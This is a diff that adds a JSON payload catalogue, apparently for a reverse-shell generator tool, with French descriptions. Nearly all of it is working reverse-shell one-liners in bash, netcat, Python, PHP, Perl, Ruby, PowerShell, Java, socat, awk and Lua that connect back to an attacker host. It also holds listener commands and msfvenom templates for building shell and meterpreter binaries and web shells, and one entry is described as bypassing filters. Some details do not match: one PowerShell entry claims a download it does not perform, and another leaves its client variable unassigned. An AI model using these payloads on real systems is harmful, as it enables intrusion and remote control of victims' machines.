@@ -1,0 +1,141 @@
+{
+  "shells": {
+    "bash_tcp": {
+      "lang": "bash",
+      "os": "linux",
+      "description": "Bash TCP classique",
+      "payload": "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1"
+    },
+    "bash_tcp_quoted": {
+      "lang": "bash",
+      "os": "linux",
+      "description": "Bash TCP via bash -c (contourne certains filtres)",
+      "payload": "bash -c 'bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1'"
+    },
+    "bash_udp": {
+      "lang": "bash",
+      "os": "linux",
+      "description": "Bash UDP",
+      "payload": "bash -i >& /dev/udp/{{LHOST}}/{{LPORT}} 0>&1"
+    },
+    "sh_mkfifo": {
+      "lang": "sh",
+      "os": "linux",
+      "description": "sh + mkfifo (compat busybox)",
+      "payload": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{LHOST}} {{LPORT}} >/tmp/f"
+    },
+    "nc_e": {
+      "lang": "nc",
+      "os": "linux",
+      "description": "Netcat avec -e (si dispo)",
+      "payload": "nc -e /bin/sh {{LHOST}} {{LPORT}}"
+    },
+    "nc_mkfifo": {
+      "lang": "nc",
+      "os": "linux",
+      "description": "Netcat sans -e",
+      "payload": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{LHOST}} {{LPORT}} >/tmp/f"
+    },
+    "ncat_ssl": {
+      "lang": "ncat",
+      "os": "multi",
+      "description": "Ncat SSL reverse shell",
+      "payload": "ncat --ssl {{LHOST}} {{LPORT}} -e /bin/bash"
+    },
+    "python3": {
+      "lang": "python",
+      "os": "multi",
+      "description": "Python 3 reverse shell",
+      "payload": "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{{LHOST}}\",{{LPORT}}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
+    },
+    "python2": {
+      "lang": "python",
+      "os": "multi",
+      "description": "Python 2 reverse shell",
+      "payload": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{LHOST}}\",{{LPORT}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
+    },
+    "php_exec": {
+      "lang": "php",
+      "os": "multi",
+      "description": "PHP exec()",
+      "payload": "php -r '$sock=fsockopen(\"{{LHOST}}\",{{LPORT}});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+    },
+    "php_system": {
+      "lang": "php",
+      "os": "multi",
+      "description": "PHP system()",
+      "payload": "php -r '$sock=fsockopen(\"{{LHOST}}\",{{LPORT}});$proc=proc_open(\"/bin/sh -i\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'"
+    },
+    "perl": {
+      "lang": "perl",
+      "os": "multi",
+      "description": "Perl reverse shell",
+      "payload": "perl -e 'use Socket;$i=\"{{LHOST}}\";$p={{LPORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+    },
+    "ruby": {
+      "lang": "ruby",
+      "os": "multi",
+      "description": "Ruby reverse shell",
+      "payload": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{{LHOST}}\",\"{{LPORT}}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+    },
+    "powershell_tcp": {
+      "lang": "powershell",
+      "os": "windows",
+      "description": "PowerShell TCP reverse shell",
+      "payload": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+    },
+    "powershell_iex": {
+      "lang": "powershell",
+      "os": "windows",
+      "description": "PowerShell IEX + download Nishang Invoke-PowerShellTcp",
+      "payload": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
+    },
+    "cmd": {
+      "lang": "cmd",
+      "os": "windows",
+      "description": "cmd.exe avec nc.exe (nécessite nc sur la cible)",
+      "payload": "nc.exe -e cmd.exe {{LHOST}} {{LPORT}}"
+    },
+    "java": {
+      "lang": "java",
+      "os": "multi",
+      "description": "Java Runtime.exec",
+      "payload": "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{{LHOST}}/{{LPORT}};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()"
+    },
+    "socat_tty": {
+      "lang": "socat",
+      "os": "linux",
+      "description": "Socat full TTY reverse shell",
+      "payload": "socat TCP:{{LHOST}}:{{LPORT}} EXEC:\"bash -li\",pty,stderr,setsid,sigint,sane"
+    },
+    "awk": {
+      "lang": "awk",
+      "os": "linux",
+      "description": "AWK reverse shell",
+      "payload": "awk 'BEGIN {s = \"/inet/tcp/0/{{LHOST}}/{{LPORT}}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
+    },
+    "lua": {
+      "lang": "lua",
+      "os": "multi",
+      "description": "Lua reverse shell",
+      "payload": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{{LHOST}}','{{LPORT}}');os.execute('/bin/sh -i <&3 >&3 2>&3');\""
+    }
+  },
+  "listeners": {
+    "nc": "nc -lvnp {{LPORT}}",
+    "rlwrap_nc": "rlwrap nc -lvnp {{LPORT}}",
+    "ncat_ssl": "ncat --ssl -lvnp {{LPORT}}",
+    "socat_tty": "socat file:`tty`,raw,echo=0 tcp-listen:{{LPORT}}",
+    "pwncat": "pwncat-cs -lp {{LPORT}}"
+  },
+  "msfvenom_templates": {
+    "linux_x64_shell": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f elf > shell.elf",
+    "linux_x86_shell": "msfvenom -p linux/x86/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f elf > shell.elf",
+    "windows_x64_shell": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe > shell.exe",
+    "windows_x86_shell": "msfvenom -p windows/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe > shell.exe",
+    "windows_x64_meterpreter": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe > met.exe",
+    "php": "msfvenom -p php/reverse_php LHOST={{LHOST}} LPORT={{LPORT}} -f raw > shell.php",
+    "aspx": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f aspx > shell.aspx",
+    "war": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f war > shell.war"
+  }
+}
